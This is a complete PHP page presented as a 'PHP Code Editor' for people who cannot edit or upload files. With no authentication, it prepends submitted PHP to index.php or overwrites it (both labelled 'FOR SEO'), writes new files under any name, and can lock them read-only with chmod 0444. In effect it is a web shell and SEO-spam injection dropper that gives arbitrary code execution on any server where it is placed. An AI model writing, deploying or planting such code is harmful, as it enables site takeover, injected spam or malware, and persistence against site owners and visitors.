<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Code Editor</title>
</head>
<body>
    <h1>Enter PHP Code</h1>
    <p>This is a solution for those who cannot edit or upload files.</p>

    <!-- Form untuk mengirim kode PHP yang ingin ditambahkan, di-overwrite, atau dibuat dalam file baru -->
    <form method="POST">
        <!-- Textarea untuk input kode PHP -->
       <textarea name="php_code" rows="10" cols="50" placeholder="Enter your PHP code here EXAMPLE:  &lt;?php echo &quot;Hello world!&quot;; ?&gt;"></textarea><br><br>

        <!-- Pilihan tindakan (append, overwrite, atau buat file baru) -->
        <label>Select Action:</label><br>
        <input type="radio" id="append" name="action" value="append" checked>
        <label for="append">Add code to the top of index.php : FOR SEO</label><br>
        <input type="radio" id="overwrite" name="action" value="overwrite">
        <label for="overwrite">Overwrite index.php : FOR SEO</label><br>
        <input type="radio" id="newfile" name="action" value="newfile">
        <label for="newfile">Create new file</label><br><br>

        <!-- Input opsional untuk nama file baru jika membuat file baru -->
        <input type="text" name="filename" placeholder="New file name (optional if creating a new file)"><br><br>

        <!-- Opsi untuk mengubah izin file menjadi read-only (0444) -->
        <label>Change file permission to 0444 (read-only)?</label><br>
        <input type="checkbox" name="change_permission" value="yes">
        <label for="change_permission">Yes, change file permission to 0444</label><br><br>

        <!-- Tombol untuk submit form -->
        <input type="submit" name="submit" value="Submit">
    </form>

    <?php
    // Mengecek apakah tombol submit telah ditekan
    if (isset($_POST['submit'])) {
        // Mengambil input dari form
        $php_code = $_POST['php_code']; // Kode PHP yang dimasukkan pengguna
        $action = $_POST['action']; // Aksi yang dipilih (append, overwrite, atau newfile)
        $filename = $_POST['filename'] ? $_POST['filename'] : 'index.php'; // Nama file, defaultnya 'index.php'
        $change_permission = isset($_POST['change_permission']) ? true : false; // Cek apakah pengguna memilih untuk mengubah izin file

        // Memastikan bahwa kode PHP tidak kosong
        if (!empty($php_code)) {
            if ($action == 'append') {
                // Baca isi file yang ada
                $existing_code = file_exists($filename) ? file_get_contents($filename) : '';
                
                // Tambahkan kode baru di baris pertama
                $new_content = $php_code . "\n" . $existing_code;

                // Tulis kembali konten baru ke file
                file_put_contents($filename, $new_content);

                echo "PHP code has been added to the top of $filename.<br>";
            } elseif ($action == 'overwrite') {
                // Meng-overwrite file dengan kode PHP baru
                file_put_contents($filename, $php_code);
                echo "The contents of $filename have been overwritten.<br>";
            } elseif ($action == 'newfile') {
                // Membuat file baru dengan nama yang diberikan
                if (!empty($filename)) {
                    file_put_contents($filename, $php_code);
                    echo "New file ($filename) has been created.<br>";
                } else {
                    echo "Please provide a file name for the new file.<br>";
                }
            }

            // Mengubah izin file menjadi read-only jika opsi dipilih
            if ($change_permission) {
                chmod($filename, 0444); // Mengubah izin file menjadi 0444
                echo "The file permission for ($filename) has been changed to 0444 (read-only).";
            }
        } else {
            // Pesan kesalahan jika kode PHP kosong
            echo "Please enter PHP code.";
        }
    }
    ?>
</body>
</html>